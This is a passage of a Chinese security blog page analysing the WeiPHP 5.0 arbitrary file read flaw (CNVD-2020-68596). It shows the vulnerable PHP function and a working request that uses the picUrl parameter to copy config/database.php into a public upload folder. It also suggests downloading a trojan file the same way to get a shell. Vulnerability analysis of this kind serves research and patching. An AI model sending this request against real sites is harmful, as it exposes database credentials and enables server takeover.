@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596" />
+<meta property="og:description" content="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 漏洞描述 Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件 漏洞影响 1 Weiphp &lt;= 5.0 网络测绘 1 app=&#34;WeiPHP&#34; 环境搭建 weiphp5.0" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596"/>
+<meta name="twitter:description" content="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 漏洞描述 Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件 漏洞影响 1 Weiphp &lt;= 5.0 网络测绘 1 app=&#34;WeiPHP&#34; 环境搭建 weiphp5.0"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" /><link rel="prev" href="http://example.org/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/" /><link rel="next" href="http://example.org/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1358 ,
+        "url": "http:\/\/example.org\/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1358 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="weiphp50-download_imgage-前台文件任意读取-cnvd-2020-68596">WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Weiphp &lt;= 5.0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;WeiPHP&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="环境搭建">环境搭建</h2>
+<p><a href="https://www.weiphp.cn/doc/Initialization_database.html" target="_blank" rel="noopener noreffer">weiphp5.0官方下载参考手册</a>
+</p>
+<p>参考官方手册创建网站即可</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181559468.png"
+        data-srcset="/images/202205181559468.png, /images/202205181559468.png 1.5x, /images/202205181559468.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181559468.png"
+        title="image-20220518155931404" /></p>
+<p>漏洞函数文件:<code>application\material\controller\Material.php</code></p>
+<p>漏洞函数:<code>_download_imgage</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181600401.png"
+        data-srcset="/images/202205181600401.png, /images/202205181600401.png 1.5x, /images/202205181600401.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181600401.png"
+        title="image-20220518160008264" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">public</span> <span class="n">function</span> <span class="n">_download_imgage</span><span class="p">(</span><span class="o">$</span><span class="n">media_id</span><span class="p">,</span> <span class="o">$</span><span class="n">picUrl</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="o">$</span><span class="n">dd</span> <span class="o">=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">savePath</span> <span class="o">=</span> <span class="n">SITE_PATH</span> <span class="o">.</span> <span class="s1">&#39;/public/uploads/picture/&#39;</span> <span class="o">.</span> <span class="n">time_format</span><span class="p">(</span><span class="n">NOW_TIME</span><span class="p">,</span> <span class="s1">&#39;Y-m-d&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mkdirs</span><span class="p">(</span><span class="o">$</span><span class="n">savePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">cover_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">picUrl</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="err">获取图片</span><span class="n">URL</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=&#39;</span> <span class="o">.</span> <span class="n">get_access_token</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;media_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">$</span><span class="n">media_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="n">dump</span><span class="p">(</span><span class="o">$</span><span class="n">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picContent</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">(</span><span class="o">$</span><span class="n">url</span><span class="p">,</span> <span class="o">$</span><span class="n">param</span><span class="p">,</span> <span class="s1">&#39;json&#39;</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picjson</span> <span class="o">=</span> <span class="n">json_decode</span><span class="p">(</span><span class="o">$</span><span class="n">picContent</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="n">dump</span><span class="p">(</span><span class="o">$</span><span class="n">picjson</span><span class="p">);</span><span class="n">die</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">picjson</span><span class="p">[</span><span class="s1">&#39;errcode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">$</span><span class="n">picjson</span><span class="p">[</span><span class="s1">&#39;errcode&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">cover_id</span> <span class="o">=</span> <span class="n">do_down_image</span><span class="p">(</span><span class="o">$</span><span class="n">media_id</span><span class="p">,</span> <span class="o">$</span><span class="n">dd</span><span class="p">[</span><span class="s1">&#39;thumb_url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!$</span><span class="n">cover_id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picName</span> <span class="o">=</span> <span class="n">NOW_TIME</span> <span class="o">.</span> <span class="n">uniqid</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.jpg&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picPath</span> <span class="o">=</span> <span class="o">$</span><span class="n">savePath</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="o">$</span><span class="n">picName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">picPath</span><span class="p">,</span> <span class="o">$</span><span class="n">picContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">content</span> <span class="o">=</span> <span class="n">wp_file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">picUrl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="err">获取图片扩展名</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picExt</span> <span class="o">=</span> <span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">picUrl</span><span class="p">,</span> <span class="n">strrpos</span><span class="p">(</span><span class="o">$</span><span class="n">picUrl</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">picExt</span><span class="p">)</span> <span class="o">||</span> <span class="o">$</span><span class="n">picExt</span> <span class="o">==</span> <span class="s1">&#39;jpeg&#39;</span> <span class="o">||</span> <span class="n">strpos</span><span class="p">(</span><span class="s1">&#39;jpg,gif,png,jpeg,bmp&#39;</span><span class="p">,</span> <span class="o">$</span><span class="n">picExt</span><span class="p">)</span> <span class="o">===</span> <span class="bp">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">picExt</span> <span class="o">=</span> <span class="s1">&#39;jpg&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picName</span> <span class="o">=</span> <span class="n">NOW_TIME</span> <span class="o">.</span> <span class="n">uniqid</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="o">$</span><span class="n">picExt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">picPath</span> <span class="o">=</span> <span class="o">$</span><span class="n">savePath</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="o">$</span><span class="n">picName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">res</span> <span class="o">=</span> <span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">picPath</span><span class="p">,</span> <span class="o">$</span><span class="n">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!$</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">$</span><span class="n">cover_id</span> <span class="o">=</span> <span class="n">do_down_image</span><span class="p">(</span><span class="o">$</span><span class="n">media_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!$</span><span class="n">cover_id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">file</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="o">$</span><span class="n">picName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;application/octet-stream&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;tmp_name&#39;</span> <span class="o">=&gt;</span> <span class="o">$</span><span class="n">picPath</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="o">$</span><span class="n">res</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;error&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="ne">File</span> <span class="o">=</span> <span class="n">D</span><span class="p">(</span><span class="s1">&#39;home/Picture&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">cover_id</span> <span class="o">=</span> <span class="o">$</span><span class="ne">File</span><span class="o">-&gt;</span><span class="n">addFile</span><span class="p">(</span><span class="o">$</span><span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">$</span><span class="n">cover_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先注意到函数的标识为<code>public</code>，也就是这个函数是公共调用的，并且变量<code>picUrl</code>为可控变量</p>
+<p>根据代码从上向下分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">savePath</span> <span class="o">=</span> <span class="n">SITE_PATH</span> <span class="o">.</span> <span class="s1">&#39;/public/uploads/picture/&#39;</span> <span class="o">.</span> <span class="n">time_format</span><span class="p">(</span><span class="n">NOW_TIME</span><span class="p">,</span> <span class="s1">&#39;Y-m-d&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">else {
+</span></span><span class="line"><span class="cl">            $content = wp_file_get_contents($picUrl);
+</span></span><span class="line"><span class="cl">            // 获取图片扩展名
+</span></span><span class="line"><span class="cl">            $picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
+</span></span><span class="line"><span class="cl">            if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
+</span></span><span class="line"><span class="cl">                $picExt = &#39;jpg&#39;;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            $picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
+</span></span><span class="line"><span class="cl">            $picPath = $savePath . &#39;/&#39; . $picName;
+</span></span><span class="line"><span class="cl">            $res = file_put_contents($picPath, $content);
+</span></span><span class="line"><span class="cl">            if (!$res) {
+</span></span><span class="line"><span class="cl">                $cover_id = do_down_image($media_id);
+</span></span><span class="line"><span class="cl">                if (!$cover_id) {
+</span></span><span class="line"><span class="cl">                    return 0;
+</span></span><span class="line"><span class="cl">                    exit();
+</span></span><span class="line"><span class="cl">                }
+</span></span><span class="line"><span class="cl">            }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析传入变量 <code>picUrl</code> 的 <code>wp_file_get_contents</code>方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$content = wp_file_get_contents($picUrl);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>函数文件位置 <code>application\common.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181601465.png"
+        data-srcset="/images/202205181601465.png, /images/202205181601465.png 1.5x, /images/202205181601465.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181601465.png"
+        title="image-20220518160112407" /></p>
+<p>可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
+</span></span><span class="line"><span class="cl">if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
+</span></span><span class="line"><span class="cl">                $picExt = &#39;jpg&#39;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
+</span></span><span class="line"><span class="cl">$picPath = $savePath . &#39;/&#39; . $picName;
+</span></span><span class="line"><span class="cl">$res = file_put_contents($picPath, $content);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里创建了有关当前时间的图片文件，并写入文件夹<code>/public/uploads/picture/</code> 下</p>
+<p>我们先尝试控制变量 <code>$picUrl</code> 来写入数据库配置文件到图片中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">public</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">material</span><span class="o">/</span><span class="ne">Material</span><span class="o">/</span><span class="n">_download_imgage</span><span class="err">?</span><span class="n">media_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">picUrl</span><span class="o">=./../</span><span class="n">config</span><span class="o">/</span><span class="n">database</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181601329.png"
+        data-srcset="/images/202205181601329.png, /images/202205181601329.png 1.5x, /images/202205181601329.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181601329.png"
+        title="image-20220518160132259" /></p>
+<p>查看目录<code>/public/uploads/picture/</code>，并用记事本打开写入的jpg文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181601445.png"
+        data-srcset="/images/202205181601445.png, /images/202205181601445.png 1.5x, /images/202205181601445.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181601445.png"
+        title="image-20220518160149362" /></p>
+<p>得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181602698.png"
